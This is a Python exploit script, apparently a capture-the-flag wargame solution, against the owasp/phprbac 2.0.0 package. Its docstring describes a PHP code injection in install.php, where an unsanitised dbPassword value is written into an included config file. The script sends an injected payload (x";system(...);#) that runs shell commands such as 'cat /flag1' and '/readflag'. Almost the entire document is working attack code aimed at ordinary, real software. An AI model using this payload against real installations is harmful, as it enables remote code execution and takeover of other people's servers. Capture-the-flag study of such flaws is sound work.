#!/usr/bin/env python3
"""
HITCON 2026 Wargame - owasp/phprbac 2.0.0 (PHP 7.4.33)
Vulnerability: install.php PHP Code Injection via file_put_contents()

install.php takes $_GET['dbPassword'] and embeds it directly in PHP code
written to database.config WITHOUT sanitization:

    $pass="' . $_GET['dbPassword'] . '"';
    file_put_contents($dbConnFile, $data);

When database.config is included via require_once during Rbac initialization,
the injected PHP code executes — immediate RCE.

Trigger chain:
  install.php?process=1 → writes database.config with injected code →
  require_once autoload.php → Jf.php → require database.config → RCE
"""
import sys
import requests


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <challenge-host>", file=sys.stderr)
        return 64

    host = sys.argv[1]
    install = f"http://{host}/vendor/owasp/phprbac/PhpRbac/install.php"

    for cmd in ["cat /flag1", "/readflag"]:
        print(f"[*] Executing: {cmd}")
        params = {
            "process": "1",
            "dbAdapter": "MySQL",
            "dbHost": "127.0.0.1",
            "dbName": "x",
            "dbTablePrefix": "x",
            "dbUser": "x",
            "dbPassword": f'x";system("{cmd} 2>&1");#',
            "dbPasswordConfirm": "x",
        }
        try:
            r = requests.get(install, params=params, timeout=15)
            for line in r.text.split("\n"):
                line = line.strip()
                if line and not line.startswith("<") and not line.startswith("!") and len(line) < 500:
                    print(f"    {line}")
        except requests.exceptions.Timeout:
            print("    [!] Timeout (code ran but DB connection hung)")
        except Exception as e:
            print(f"    [!] Error: {e}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
